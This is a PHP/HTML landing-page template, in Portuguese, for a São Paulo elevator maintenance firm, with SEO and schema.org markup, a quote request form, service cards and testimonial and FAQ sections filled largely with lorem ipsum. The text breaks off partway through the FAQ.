<!doctype html>
<html lang="pt" xml:lang="pt" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php echo $titulo . " " . $nome_site; ?></title>
<meta name="description" content="<?php echo $nm_description; ?>"/>
<link rel="canonical" href="<?php echo $nm_slug; ?>" />
<meta name="robots" content="all, index, follow">
<meta name="Googlebot" content="index,follow, all">
<meta name="MSNbot" content="index,follow, all">
<meta name="InktomiSlurp" content="index,follow, all">
<meta name="Unknownrobot" content="index,follow, all">
<meta name="rating" content="General">
<meta name="audience" content="all">      
<meta name="og:region" content="<?php echo $nm_bairro; ?>, São Paulo - SP" /> 
<meta name="geo.position" content="<?php echo $cd_latitude; ?>;<?php echo $cd_longitude; ?>" />
<meta name="geo.placename" content="<?php echo $nm_bairro; ?>, São Paulo - SP" />
<meta name="distribution" content="global"/>       
<meta property="og:locale" content="pt_BR" /> 
<meta name="copyright" content="<?php echo $nome_site; ?>" />
<!-- Social: Facebook / Open Graph -->
<meta property="fb:admins" content="<?php include("includes/fb-admins.php"); ?>">
<meta property="og:url" content="<?php echo $nm_slug; ?>">
<meta property="og:type" content="website">
<meta property="og:title" content="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?> - <?php echo $nome_site; ?>">
<meta property="og:image" content="<?php echo $nm_imagem_rede_social; ?>">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image:width" content="800"> 
<meta property="og:image:height" content="400">
<meta property="og:image:alt" content="<?php echo $nm_servico; ?> - <?php echo $nm_bairro; ?>" /> 
<meta property="og:description" content="<?php echo $nm_description; ?>">
<meta property="og:site_name" content="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?> - <?php echo $nome_site; ?>">
<meta property="article:author" content="<?php include("includes/article-author-facebook.php"); ?>">
<meta property="article:publisher" content="<?php include("includes/article-publisher-facebook.php"); ?>">
<meta property="article:tag" content="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?>">
<!-- Social: Twitter -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="<?php include("includes/twittersite.php"); ?>">
<meta name="twitter:title" content="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?> - <?php echo $nome_site; ?>">
<meta name="twitter:url" content="<?php echo $nm_slug; ?>">
<meta name="twitter:description" content="<?php echo $nm_description; ?>">
<meta property="twitter:image:src" content="<?php echo $nm_imagem_rede_social; ?>">
<link rel="author" href="<?php include("includes/publisher-google.php"); ?>">
<!-- Social: Google+ / Schema.org  -->
<meta property="og:title" content="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?> - <?php echo $nome_site; ?>" />
<meta property="og:image" content="<?php echo $nm_imagem_rede_social; ?>" />
<meta property="og:description" content="<?php echo $nm_description; ?>" />
 <link rel="shortcut icon" href="<?php echo HTTP_HOST; ?>images/favicon.png" type="image/x-icon">
<?php include("includes/google-analytics.php"); ?>
<link rel="stylesheet" href="<?php echo HTTP_HOST; ?>sp/css/style.css">

<!-- LocalBusiness  -->
<script type="application/ld+json">{"@context":"http://schema.org","@type":"<?php include("includes/type.php"); ?>","additionalType":"<?php include("includes/additional-type.php"); ?>","brand":{"@type":"Brand","name":"<?php echo $nome_site; ?>"},"name":"<?php echo $nome_site;?>","url":"<?php echo $nm_slug; ?>","logo":"<?php echo HTTP_HOST; ?>img/logo.png","image":"<?php echo HTTP_HOST; ?>img/empresa.jpg",
"hasMap":"<?php include("includes/hasmap.php"); ?>"
,"email":"<?php echo $email ?>","address":{"@type":"PostalAddress","addressLocality":"<?php echo $cidade ?>","addressRegion":"<?php echo $estado ?>","postalCode":"<?php echo $cep ?>","streetAddress":"<?php echo $endereco ?>"},"description":"<?php include("includes/description-localbusiness.php"); ?>","telephone":"(11) <?php echo $telefone1 ?>",
"openingHoursSpecification":[{"@type":"OpeningHoursSpecification","dayOfWeek":["Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"opens":"09:00","closes":"18:00"}
],
"priceRange":"$$$",
"sameAs" : [<?php include("includes/branding-social.php"); ?>],
 "areaServed":[
{"@type":"City","name":"<?php echo $nm_cidade; ?>"},
{"@type": "Place",
  "name": "<?php echo $nm_bairro; ?>",
  "geo": {
    "@type": "GeoCoordinates",
    "latitude": "<?php echo $cd_latitude; ?>",
    "longitude": "<?php echo $cd_longitude; ?>"
  }
 }
 ]

}</script>
<!-- / LocalBusiness  -->
</head>
<body>
<header id="header">
<div class="container">
<div class="row">
<div class="col-md-12">
<div class="logo" itemscope itemtype="https://schema.org/WPHeader">
<span itemprop="headline" class="conteudo"><?php echo $nm_servico; ?> <?php echo $nm_bairro; ?> - <?php echo $nome_site; ?></span>
<a  itemprop="url" href="<?php echo $nm_slug; ?>"><img src="<?php echo HTTP_HOST; ?>sp/img/logo.png" alt="Logo da <?php echo $nome_site; ?> <?php echo $nm_servico; ?>" title="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?>" class="img-responsive"></a>
</div>
<div class="navigation">
<nav itemscope itemtype="https://schema.org/SiteNavigationElement">
<ul class="custom-list list-inline">
<li><a title="Home - <?php echo $nome_site; ?>" itemprop="url" href="#Home" style="font-size:15px;color:#666"><span itemprop="name">Home</span></a></li>
<li><a title="<?php echo $nome_site; ?>" itemprop="url" href="#M-Elevator" style="font-size:15px;color:#666"><span itemprop="name">M Elevator</span></a></li>
<li><a title="<?php echo $nm_servico; ?> <?php echo $nm_bairro; ?>" itemprop="url" href="#Servicos" style="font-size:15px;color:#666"><span itemprop="name">Serviços</span></a></li>
<li><a title="Serviços Executados" itemprop="url" href="#Servicos-Executados" style="font-size:15px;color:#666"><span itemprop="name">Portfólio</span></a></li>
<li><a title="Depoimentos de Clientes" itemprop="url" href="#depoimentos" style="font-size:15px;color:#666"><span itemprop="name">Depoimentos</span></a></li>
<li><a title="Perguntas e Respostas" itemprop="url" href="#faq" style="font-size:15px;color:#666"><span itemprop="name">FAQ</span></a></li>
<li><a title="Orçamento <?php echo $nm_servico; ?>" itemprop="url" href="#Home" class="btn btn-red"><span itemprop="name">Contato</span></a></li>
</ul>
</nav>
<i class="fa fa-list toggleMenu"></i>
</div>
</div>
</div>
</div>
</header>
<div id="Home"></div>
<section id="hero">
<div id="gradient"></div>
<div class="container">
<div class="row">
<div class="hero-text">
<div class="col-md-7" itemscope itemtype="http://schema.org/WebPage">
<h1 class="title" itemprop="headline"><?php echo $nm_servico; ?> <?php echo $nm_bairro; ?></h1>
<div itemprop="description">
<p class="lead">
A M Elevation, as soluções de manutenção incluem uma grande variedade de módulos individuais, de modo que possamos fornecer apenas o nível de cuidados que você precisa. Assim, se a sua principal preocupação é segurança, conformidade, transparência operacional e desempenho superior, é conosco que você pode contar.
</p>
<p class="lead">
Nosso padrão para serviços de manutenção avançados garante uma vida útil mais longa ao seu equipamento e, principalmente, um melhor desempenho. As soluções de manutenção que oferecemos são adaptadas às suas necessidades, contam com a mais alta qualidade do mercado e estão em conformidade com os mais elevados padrões de segurança. Com esse padrão de excelência de serviços, conquistamos a confiabilidade por parte do cliente em nossas atividades.
</p>
	
<ul class="features-list custom-list">
<li><i class="fa fa-check"></i><span style="color:#cccccc">Há 10 anos, a M Elevation faz capacitação e treinamento dos seus profissionais</span></li>
<li><i class="fa fa-check"></i><span style="color:#cccccc">Possuimos frota de veículos e peças para reposição de todas as marcas de elevadores.</span></li>
<li><i class="fa fa-check"></i><span style="color:#cccccc">CREA sob no.13314-D, na PMSP - Divisão de Elevadores – registro nº. 2.01915-9</span></li>
<li><i class="fa fa-check"></i><span style="color:#cccccc">CONTRU 5 da SEHAB, nº.00020, nos requisitos nos Decreto nº. 33.948</span></li>
<li><i class="fa fa-check"></i><span style="color:#cccccc">Fazemos parte do SECIESP – Sindicato das Empresas de Conservação e Instalação de Elevadores no Estado SP</span></li>
</ul>
</div>
</div>
</div>

<div class="col-md-5">
<div class="hero-form">
<form action="<?php echo HTTP_HOST; ?>contato-sucesso" class="default-form" method="post">
<input type="hidden" name="lp" value="ok">
<input type="hidden" name="url" value="<?php echo $nm_slug; ?>">
	
<p class="form-title" style="font-size:19px">Orçamento Gratuito Aqui</p>
<div class="field">
<input type="text" name="nome" placeholder="Qual se nome?" required>
<input type="email" name="email" placeholder="Informe seu e-mail para contato" required>
<input type="text" name="telefone" placeholder="Informe seu telefone" required>
<input type="text" name="whatsapp" placeholder="Tem WhatsApp?">
<input type="text" name="cidade" placeholder="Qual sua Cidade?" required>
</div>
<div class="field select-box">
<select required name="servico" data-placeholder="Qual o tipo de serviço que precisa?">

<option value="">Selecione o serviço que precisa</option>
<?php for ($i=0; $i < count($objS); $i++) { ?>
  <option value="<?php echo $objS[$i]->id_servico; ?>"><?php echo $objS[$i]->nm_servico; ?></option>
<?php } ?>

</select>
<i class="fa fa-sort"></i>
</div>
<div class="field">
<input type="text" name="observacao" placeholder="Observações">
<button class="btn btn-red">Solicitar Orçamento Gratuito</button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>

<section style="background:#333333;">
<h6 style="font-size:19px;" class="conteudo">Empresa de Manutenção e Modernização de Elevadores</h6>
<div class="container" style="padding:10px;">
<div class="row">
<div class="col-xs-12">
<div class="breadCumpNav"  itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a style="color:#cccccc;" itemprop="item" href="<?php echo HTTP_HOST; ?>">
<span itemprop="name"><?php echo $nome_site; ?></span></a>
<meta itemprop="position" content="1" />
</span>
<i class="fa fa-angle-right" style="color:#cccccc;"> </i>
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a style="color:#cccccc;" itemprop="item" href="<?php echo HTTP_HOST; ?>servicos">
<span itemprop="name">Serviços</span></a>
<meta itemprop="position" content="2" />
</span>
<i class="fa fa-angle-right" style="color:#cccccc;"> </i>
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a style="color:#cccccc;" itemprop="item" href="<?php echo $nm_slug; ?>">
<span itemprop="name"><?php echo $nm_servico; ?> <?php echo $nm_bairro; ?></span></a>
<meta itemprop="position" content="3" />
</span>
</div>
</div>
</div>
</div>
</section>

<section id="clients">
<div class="container">
<div class="row">
<div class="col-md-12" itemscope itemtype="http://schema.org/ImageObject">
<h4 class="title" itemprop="name">Certificações para serviços de Limpeza</h4>
<meta itemprop="contentLocation" content="<?php echo $nm_bairro; ?>">
<div id="clients-slider" class="owl-carousel">
<span><meta itemprop="name" content="NR 01"><meta itemprop="caption" content="Certificação para Prevenção de Segurança e Saúde no Trabalho">
<img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/nr-01.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
<span><meta itemprop="name" content="NR 10"><meta itemprop="caption" content="Certificação de Segurança em Instalações e Serviços em Eletricidade"><img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/nr-10.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
<span><meta itemprop="name" content="NR 18"><meta itemprop="caption" content="Certificação de Segurança na indústria da construção civil"><img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/nr-18.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
<span><meta itemprop="name" content="NR 33"><meta itemprop="caption" content="Certificação para Trabalho em espaço confinado"><img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/nr-33.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
<span><meta itemprop="name" content="NR 35"><meta itemprop="caption" content="Certificação de Proteção para o trabalho em altura"><img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/nr-35.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
<span><meta itemprop="name" content="PCMSO"><meta itemprop="caption" content="Certificação para Programa de Controle Médico de Saúde Ocupacional"><img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/pcmso.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
<span><meta itemprop="name" content="PPRA"><meta itemprop="caption" content="Certificação paraPrograma de Prevenção de Riscos Ambientais"><img itemprop="url" src="<?php echo HTTP_HOST; ?>sp/img/certificacoes/ppra.jpg" alt="" class="img-responsive" width="150" height="75"></span> 
</div>
</div>
</div>
</div>
</section>

<div id="M-Elevator"></div>
<section id="tour">
<div class="part first-part">
<div class="container">
<div class="row">
<div class="col-md-7">
<div class="preamble text-left">
<h4 class="title" style="font-size:20px;">M Elevator - <?php echo $nm_servico; ?> <?php echo $nm_bairro; ?> - São Paulo</h4>
<p class="lead">nterdum et malesuada fames ac ante ipsum primis in faucibus. Maecenas suscipit posuere diam, vel mollis arcu facilisis a.</p>
</div>
<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pretium varius elit, mattis fringilla libero ultrices non. Aliquam ultrices lorem dui, interdum egestas arcu bibendum a. Nunc mattis fermentum lacus, ac tempor lorem congue ut. Mauris sit amet odio tempus, semper lectus ut, condimentum ipsum. Nam eget elit urna. Nam vitae lobortis leo. Donec quis laoreet magna. Integer ut mauris cursus ante consequat aliquet et in lorem. Nunc lobortis tellus at ex pulvinar, id bibendum nibh euismod.</p>
<p>Proin ac ante vel tellus sodales interdum. Nulla facilisi. Nunc sed mi elit. Maecenas luctus pellentesque orci pellentesque dapibus. Morbi semper feugiat elementum. Sed quis to</p>
<ul class="features-list custom-list">
<li><i class="fa fa-check"></i><span>sssssssssssssssssss</span></li>
<li><i class="fa fa-check"></i><span>sssssssssssssssssss</span></li>

</ul>
</div>
<div class="col-md-5">
<img src="<?php echo HTTP_HOST; ?>sp/img/manutencao-de-elevadores.jpg" alt="<?php echo $nm_servico; ?>" title="Homem executando <?php echo $nm_servico; ?> <?php echo $nm_bairro; ?>" class="img-responsive" width="500" height="363">
</div>
</div>
</div>
</div>
</section>


<div id="Servicos"></div>
<section id="features">
<div class="container">
<div class="row">
<div class="col-md-12 preamble" style="margin-top:-60px;">
<h2 class="title" style="font-size:20px;">Nossos serviços de <?php echo $nm_servico; ?></h2>
<p>Sed ut mattis lacus. Etiam vitae pulvinar massa. Pellentesque risus massa, rhoncus ut ullamcorper non, ullamcorper nec turpis. Fusce vel ultricies lorem. In elementum nisl diam, eleifend posuere purus aliquet ut. Pellentesque interdum felis nibh. Maecenas pharetra volutpat neque quis rutrum. Quisque sapien urna, accumsan id leo sit amet, viverra placerat urna.</p>
</div>


<div class="col-md-4" itemscope itemtype="http://schema.org/Service">
<div class="feature-content">
<h3 class="title" style="font-size:16px;" itemprop="serviceType">Manutenção de Elevadores</h3>
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?>sp/img/manutencao-de-elevador.jpg" class="img-responsive" width="372" height="173">
<meta itemprop="name" content="Manutenção preventida de elevadores - São Miguel Paulista">
</div>
<p itemprop="category" class="conteudo">Manutenção de Elevadores <?php echo $nm_bairro; ?></p>
<p itemprop="description">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Earum, a dolorum, beatae perspiciatis non veniam fugiat molestias veritatis ipsum quis, magnam ipsa quibusdam illo alias autem esse saepe blanditiis sint.</p>
</div>
</div>


<div class="col-md-4" itemscope itemtype="http://schema.org/Service">
<div class="feature-content">
<h3 class="title" style="font-size:16px;" itemprop="serviceType">Manutenção Preventiva</h3>
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?>sp/img/manutencao-preventiva.jpg" class="img-responsive" width="372" height="173">
<meta itemprop="name" content="Manutenção preventida de elevadores - São Miguel Paulista">
</div>
<p itemprop="category" class="conteudo">Manutenção Preventiva <?php echo $nm_bairro; ?></p>
<p itemprop="description">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Earum, a dolorum, beatae perspiciatis non veniam fugiat molestias veritatis ipsum quis, magnam ipsa quibusdam illo alias autem esse saepe blanditiis sint.</p>
</div>
</div>


<div class="col-md-4" itemscope itemtype="http://schema.org/Service">
<div class="feature-content">
<h3 class="title" style="font-size:16px;" itemprop="serviceType">Modernização de Elevadores</h3>
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?>sp/img/modernizacao-de-elevadores.jpg" class="img-responsive" width="372" height="173">
<meta itemprop="name" content="Manutenção preventida de elevadores - São Miguel Paulista">
</div>
<p itemprop="category" class="conteudo">Modernização de Elevadores <?php echo $nm_bairro; ?></p>
<p itemprop="description">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Earum, a dolorum, beatae perspiciatis non veniam fugiat molestias veritatis ipsum quis, magnam ipsa quibusdam illo alias autem esse saepe blanditiis sint.</p>
</div>
</div>


<div class="col-md-4" itemscope itemtype="http://schema.org/Service">
<div class="feature-content">
<h3 class="title" style="font-size:16px;" itemprop="serviceType">Modernização Estética</h3>
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?>sp/img/modernizacao-estetica.jpg" class="img-responsive" width="372" height="173">
<meta itemprop="name" content="Manutenção preventida de elevadores - São Miguel Paulista">
</div>
<p itemprop="category" class="conteudo">Modernização Estética <?php echo $nm_bairro; ?></p>
<p itemprop="description">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Earum, a dolorum, beatae perspiciatis non veniam fugiat molestias veritatis ipsum quis, magnam ipsa quibusdam illo alias autem esse saepe blanditiis sint.</p>
</div>
</div>


<div class="col-md-4" itemscope itemtype="http://schema.org/Service">
<div class="feature-content">
<h3 class="title" style="font-size:16px;" itemprop="serviceType">Modernização Tecnológica</h3>
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?>sp/img/modernizacao-tecnologica.jpg" class="img-responsive" width="372" height="173">
<meta itemprop="name" content="Manutenção preventida de elevadores - São Miguel Paulista">
</div>
<p itemprop="category" class="conteudo">Modernização Tecnológica <?php echo $nm_bairro; ?></p>
<p itemprop="description">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Earum, a dolorum, beatae perspiciatis non veniam fugiat molestias veritatis ipsum quis, magnam ipsa quibusdam illo alias autem esse saepe blanditiis sint.</p>
</div>
</div>


<div class="col-md-4" itemscope itemtype="http://schema.org/Service">
<div class="feature-content">
<h3 class="title" style="font-size:16px;" itemprop="serviceType">Assistência Técnica 24h</h3>
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?>sp/img/assistencia-tecnica-24h.jpg" class="img-responsive" width="372" height="173">
<meta itemprop="name" content="Manutenção preventida de elevadores - São Miguel Paulista">
</div>
<p itemprop="category" class="conteudo">Assistência Técnica 24h de Elevadores <?php echo $nm_bairro; ?></p>
<p itemprop="description">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Earum, a dolorum, beatae perspiciatis non veniam fugiat molestias veritatis ipsum quis, magnam ipsa quibusdam illo alias autem esse saepe blanditiis sint.</p>
</div>
</div>






</div>
</div>
</section>


<div id="Servicos-Executados"></div>
<section id="about">
<div class="container">
<div class="row">
<div class="col-md-10 col-md-offset-1 preamble">
<h4 class="title" style="font-size:20px;">Trabalhos Executados - <?php echo $nm_servico; ?></h4>
<p><?php echo $nm_resumo; ?></p>
</div>

<?php for ($i=0; $i < count($objF); $i++) { ?>

<div class="col-md-4 person" itemscope itemtype="http://schema.org/CreativeWork">
<div itemprop="image" itemscope itemtype="http://schema.org/ImageObject">
<img itemprop="url" alt="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>" src="<?php echo HTTP_HOST; ?><?php echo $objF[$i]->nm_foto; ?>" class="img-responsive" width="450" height="349">
<meta itemprop="name" content="Manutenção preventida de elevadores - <?php echo $nm_bairro; ?>">
</div>
<h4 itemprop="headline" style="font-size:15px;"><?php echo $objF[$i]->nm_titulo; ?></h4>
<p itemprop="description"><?php echo $objF[$i]->tx_descricao; ?></p>
<meta itemprop="sourceOrganization" content="<?php echo $nome_site; ?> - <?php echo $nm_servico; ?> <?php echo $nm_bairro; ?>" />
<p itemprop="alternativeHeadline" class="conteudo"><?php echo $nm_servico; ?>. Local - <?php echo $nm_bairro; ?></p>
<div itemprop="locationCreated" itemscope itemtype="http://schema.org/Place" class="conteudo">
<span itemprop="name"><?php echo $objF[$i]->nm_local; ?></span>
<meta itemprop="HasMap" content="<?php echo $objF[$i]->url_hasmap; ?>">
<div itemprop="address" itemscope itemtype="http://schema.org/PostalAddress">
<span itemprop="streetAddress"><?php echo $objF[$i]->nm_endereco; ?></span><br>
<span itemprop="addressLocality"><?php echo $objF[$i]->nm_cidade; ?></span>
<span itemprop="addressRegion"><?php echo $objF[$i]->cd_estado; ?></span>
<span itemprop="postalCode"><?php echo $objF[$i]->nr_cep; ?></span>
</div>
<div itemprop="geo" itemscope itemtype="http://schema.org/GeoCoordinates">
<meta itemprop="latitude" content="<?php echo $objF[$i]->cd_latitude; ?>" />
<meta itemprop="longitude" content="<?php echo $objF[$i]->cd_longitude; ?>" />
</div>
</div>
</div>

<?php } ?>

</div>
</div>
</section>

<div id="depoimentos"></div>
<section id="tour2" itemscope itemtype="http://schema.org/AboutPage">
<div class="part second-part gray-bg">
<div class="container">
<div class="row">
<div class="col-md-6">
<img src="<?php echo HTTP_HOST; ?>sp/img/m-elevation.jpg" alt="" class="img-responsive" width="500" height="363">
</div>
<div class="col-md-6">
<div class="preamble text-left">
<h5 itemprop="name" style="font-size:19px;">Depoimentos de clientes</h5>
</div>
<div itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating" class="conteudo">
<p class="lead">Nossa avaliação é de  <span itemprop="ratingValue">5</span> / 5 Baseado em <span itemprop="reviewCount">2</span> Comentários</p>
</div>
<div class="quotes">

<div class="quote-single" itemprop="review" itemscope itemtype="http://schema.org/Review">
<blockquote itemprop="description">
"Lorem ipsum dolor sit amet, consectetur adipisicing elit. Reprehenderit distinctio cupiditate repellendus quod
<div class="clearfix"></div>
<p itemprop="name" style=color:#FC640A;>Recomento essa empresa</p> Por: <h5 itemprop="author">André Braga</h5> em
<meta itemprop="datePublished" content="2018-10-02">02 de Outubro de 2018
<div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
<meta itemprop="worstRating" content="1">
<span itemprop="ratingValue">5</span>/
<span itemprop="bestRating">5</span>
<ul class="rate custom-list list-inline">
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
</ul> </div>
</blockquote>
</div>

<div class="quote-single" itemprop="review" itemscope itemtype="http://schema.org/Review">
<blockquote itemprop="description">
"Lorem ipsum dolor sit amet, consectetur adipisicing elit. Reprehenderit distinctio cupiditate repellendus quod
<div class="clearfix"></div>
<p itemprop="name" style=color:#FC640A;>Recomento essa empresa</p> Por: <h5 itemprop="author">André Braga</h5> em
<meta itemprop="datePublished" content="2018-10-02">02 de Outubro de 2018
<div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating">
<meta itemprop="worstRating" content="1">
<span itemprop="ratingValue">5</span>/
<span itemprop="bestRating">5</span>
<ul class="rate custom-list list-inline">
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
<li><i class="fa fa-star"></i></li>
</ul> </div>
</blockquote>
</div>

</div>
</div>
</div>
</div>
</div>
</section>

<section id="pricing">
<div class="container">
<div class="row">
<div class="col-md-12">

<h6 style="font-size:19px;">Funcionamento de um elevador</h6>

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pretium varius elit, mattis fringilla libero ultrices non. Aliquam ultrices lorem dui, interdum egestas arcu bibendum a. Nunc mattis fermentum lacus, ac tempor lorem congue ut. Mauris sit amet odio tempus, semper lectus ut, condimentum ipsum. Nam eget elit urna. Nam vitae lobortis leo. Donec quis laoreet magna. Integer ut mauris cursus ante consequat aliquet et in lorem. Nunc lobortis tellus at ex pulvinar, id bibendum nibh euismod. Interdum et malesuada fames ac ante ipsum primis in faucibus. Maecenas suscipit posuere diam, vel mollis arcu facilisis a. In a nisl ut nisi placerat tempor quis eu libero. Mauris id est vitae est semper consequat vel id dui. Aenean gravida nibh nunc, ut tempus arcu dignissim ac. Integer consectetur, velit sed pellentesque auctor, libero mauris iaculis dui, egestas vestibulum velit nulla quis diam. Curabitur luctus mauris id nunc ultricies tincidunt.</p>

<p>Proin ac ante vel tellus sodales interdum. Nulla facilisi. Nunc sed mi elit. Maecenas luctus pellentesque orci pellentesque dapibus. Morbi semper feugiat elementum. Sed quis tortor nec leo tristique mattis at et nisi. Sed egestas, sem a gravida ullamcorper, odio purus semper nisl, in fermentum nulla nulla ut urna. Aenean lacinia felis diam, in sollicitudin felis auctor in. Ut sit amet accumsan mi. Donec ut ante hendrerit, consectetur est et, fringilla tellus. Etiam eleifend pretium nunc, eu dignissim tellus efficitur vitae. Fusce convallis nunc dolor, sed egestas lorem mollis quis.</p>

<p>Sed ut mattis lacus. Etiam vitae pulvinar massa. Pellentesque risus massa, rhoncus ut ullamcorper non, ullamcorper nec turpis. Fusce vel ultricies lorem. In elementum nisl diam, eleifend posuere purus aliquet ut. Pellentesque interdum felis nibh. Maecenas pharetra volutpat neque quis rutrum. Quisque sapien urna, accumsan id leo sit amet, viverra placerat urna. Nullam congue libero ligula, in pulvinar nulla accumsan eleifend. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum vitae augue venenatis, dictum ante sit amet, volutpat augue. Cras in magna felis. Maecenas sed sapien sed eros tempor vestibulum. Donec a leo eget felis mattis rutrum. Sed pellentesque vehicula lacinia. Duis lacus justo, bibendum eu sodales sit amet, porttitor nec augue. Donec ac dolor facilisis, aliquam nisl eget, vestibulum dui.</p>

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque pretium varius elit, mattis fringilla libero ultrices non. Aliquam ultrices lorem dui, interdum egestas arcu bibendum a. Nunc mattis fermentum lacus, ac tempor lorem congue ut. Mauris sit amet odio tempus, semper lectus ut, condimentum ipsum. Nam eget elit urna. Nam vitae lobortis leo. Donec quis laoreet magna. Integer ut mauris cursus ante consequat aliquet et in lorem. Nunc lobortis tellus at ex pulvinar, id bibendum nibh euismod. Interdum et malesuada fames ac ante ipsum primis in faucibus. Maecenas suscipit posuere diam, vel mollis arcu facilisis a. In a nisl ut nisi placerat tempor quis eu libero. Mauris id est vitae est semper consequat vel id dui. Aenean gravida nibh nunc, ut tempus arcu dignissim ac. Integer consectetur, velit sed pellentesque auctor, libero mauris iaculis dui, egestas vestibulum velit nulla quis diam. Curabitur luctus mauris id nunc ultricies tincidunt.</p>

</div>

</div>
</div>
</section>
<section id="faq">
<div class="container">
<div class="row">
<div class="col-md-8 col-md-offset-2 preamble">
<h4 style="font-size:19px;">Perguntas e Respostas</h4>
</div>

<div class="col-md-6">
<div class="question" itemscope itemtype="http://schema.org/Question">
<i class="fa fa-comment"></i><h4 class="title" itemprop="name">Is it wordpress theme?</h4>
<div itemprop ="acceptedAnswer" itemscope itemtype="http://schema.org/Answer">
<p itemprop="text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ratione doloremque quidem deserunt aperiam qui molestias officiis nisi ut aspernatur aliquam eveniet, porro eius iure eligendi laboriosam dolores, nobis sunt consectetur?</p>
</div>
</div>
</div>

<div class="col-md-6">
<div class="question" itemscope itemtype="http://schema.org/Question">
<i class="fa fa-comment"></i><h4 class="title" itemprop="name">Is it wordpress theme?</h4>
<div itemprop ="acceptedAnswer" itemscope itemtype="http://schema.org/Answer">
<p itemprop="text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ratione doloremque quidem deserunt aperiam qui molestias officiis nisi ut aspernatur aliquam eveniet, porro eius iure eligendi laboriosam dolores, nobis sunt consectetur?</p>
</div>
</div>
</div>

<div class="col-md-6">
<div class="question" itemscope itemtype="http://schema.org/Question">
<i class="fa fa-comment"></i><h4 class="title" itemprop="name">Can you help me with customization?</h4>
<div itemprop ="acceptedAnswer" itemscope itemtype="http://schema.org/Answer">
<p itemprop="text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ratione doloremque quidem deserunt aperiam qui molestias officiis nisi ut aspernatur aliquam eveniet, porro eius iure eligendi laboriosam dolores, nobis sunt consectetur?</p>
</div>
</div>
</div>
	
<div class="col-md-6">
<div class="question" itemscope itemtype="http://schema.org/Question">
<i class="fa fa-comment"></i><h4 class="title" itemprop="name">When wordpress version will be available?</h4>
<div itemprop ="acceptedAnswer" itemscope itemtype="http://schema.org/Answer">
<p itemprop="text">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ratione doloremque quidem deserunt aperiam qui molestias officiis nisi ut aspernatur aliquam eveniet, porro eius iure eligendi laboriosam dolores, nobis sunt consectetur?</p>
</div>
</div>
</div>

<div class="col-md-6">
<div class="question" itemscope itemtype="http://schema.org/Question">
<i class="fa fa-comment"></i><h4 class="title" itemprop="name">Are you able to hire?</h4>
<div itemprop ="acceptedAnswer" itemscope itemtype="http://schema.org/Answer">
